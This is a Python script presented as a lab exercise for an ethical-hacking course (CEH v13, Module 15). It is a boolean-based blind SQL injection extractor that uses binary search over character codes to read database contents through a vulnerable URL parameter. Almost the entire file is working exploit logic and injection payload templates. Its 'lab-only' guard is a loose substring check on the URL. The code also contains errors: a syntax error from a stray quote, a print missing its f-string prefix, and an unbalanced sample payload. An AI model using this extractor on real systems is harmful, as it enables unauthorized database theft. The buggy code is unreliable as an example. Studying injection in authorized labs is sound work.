#!/usr/bin/env python3
# LAB-ONLY: Boolean-Based Blind SQL Injection Extractor
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Extracts data character by character using boolean-based blind SQLi!
# Uses binary search to speed up extraction!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id="
LAB_TRUE_INJECTION_POINT = "' AND (SELECT SUBSTRING((SELECT database()),1,1)='a' -- "
LAB_TRUE_INDICATOR = "Welcome Admin"  # What appears in page if true
# Example queries:
LAB_QUERY_TEMPLATE = "' AND ASCII(SUBSTRING(({query}),{pos},1))>{char}) -- "
LAB_TARGET_QUERY = "SELECT database()"  # Change to what you want (e.g., SELECT user(), SELECT version())
# -----------------------------------------------------------------------------------

def test_condition(payload):
    full_url = f"{LAB_TARGET_URL}{payload}"
    try:
        response = requests.get(full_url, timeout=5, verify=False)
        return LAB_TRUE_INDICATOR in response.text
    except Exception as e:
        print(f"Error: {e}")
        return False

def extract_length(query):
    length = 0
    while True:
        # Test if length > X
        payload = f"' AND (SELECT LENGTH(({query})))>{length} -- "
        if test_condition(payload):
            length += 1
        else:
            break
    print(f"[+] Extracted length: {length}")
    return length

def extract_data(query, length):
    result = ""
    for pos in range(1, length+1):
        # Binary search for each character
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid} -- "
            if test_condition(payload):
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[+] Extracted so far: {result}", end="\r")
    print("\n[+] Final result: {result}")
    return result

def main():
    print("="*80)
    print("LAB-ONLY: Boolean-Based Blind SQL Injection Extractor")
    print("="*80)
    print(f"[*] Target URL: {LAB_TARGET_URL}")
    print("-"*80")
    length = extract_length(LAB_TARGET_QUERY)
    extract_data(LAB_TARGET_QUERY, length)

if __name__ == "__main__":
    # LAB validation
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
